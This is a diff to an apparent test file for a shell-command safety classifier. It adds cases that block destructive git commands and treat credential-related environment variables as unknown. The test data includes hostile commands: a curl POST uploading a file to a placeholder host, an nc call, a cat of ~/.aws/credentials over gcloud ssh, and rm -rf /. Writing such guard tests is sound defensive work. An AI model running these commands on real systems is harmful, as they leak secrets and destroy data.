@@ -503,6 +503,9 @@ NESTED_INNER = {
     "curl -X POST -d @/app/f https://x.invalid": "SIGNED",
     "touch /app/x": "UNKNOWN",
     "nc x.invalid 80": "UNKNOWN",
+    "git checkout -- .": "BLOCKED",
+    "git stash drop": "BLOCKED",
+    "git stash clear": "BLOCKED",
 }
 NESTED_ARGV_EXECUTORS = {
     "kubectl": "kubectl exec pod-1 -- {inner}",
@@ -618,6 +621,20 @@ NESTED_PINS = [
     ("gcloud compute ssh vm-1 --command 'ls; cat ~/.aws/credentials'", "none", {"BLOCKED"}, "floor.secret-read"),
     ("kubectl exec pod-1 -- sh -c 'rm -rf /'", "none", {"BLOCKED"}, ""),
     ("gcloud compute ssh vm-1 --command 'echo hi; rm -rf /'", "none", {"BLOCKED"}, ""),
+    ("kubectl exec pod-1 git checkout -- .", "none", {"BLOCKED"}, ""),
+    ("kubectl exec pod-1 git stash drop", "none", {"BLOCKED"}, ""),
+    ("frobctl exec -- git stash clear", "none", {"BLOCKED"}, ""),
+    ("ssh host1 git checkout -- .", "none", {"BLOCKED"}, ""),
+    ("kubectl exec pod-1 -- git push --force origin main", "none", {"SIGNED"}, ""),
+    ("KUBECONFIG=/x kubectl exec pod-1 -- ls", "none", {"UNKNOWN"}, "unknown.dynamic-span"),
+    ("env KUBECONFIG=/x kubectl exec pod-1 -- ls", "none", {"UNKNOWN"}, "unknown.dynamic-span"),
+    ("KUBECONFIG=/x oc exec pod-1 -- ls", "none", {"UNKNOWN"}, "unknown.dynamic-span"),
+    ("DOCKER_HOST=tcp://h:2375 docker exec c1 ls", "none", {"UNKNOWN"}, "unknown.dynamic-span"),
+    ("env DOCKER_HOST=tcp://h:2375 docker exec c1 ls", "none", {"UNKNOWN"}, "unknown.dynamic-span"),
+    ("DOCKER_CONFIG=/x docker exec c1 ls", "none", {"UNKNOWN"}, "unknown.dynamic-span"),
+    ("FOO=1 kubectl exec pod-1 -- ls", "none", {"FREE"}, ""),
+    ("gcloud compute ssh vm-1 --impersonate-service-account=sa@x --command ls", "none", {"UNKNOWN"}, "unknown.dynamic-span"),
+    ("gcloud --impersonate-service-account sa@x compute ssh vm-1 --command ls", "none", {"UNKNOWN"}, "unknown.dynamic-span"),
 ]
 
 
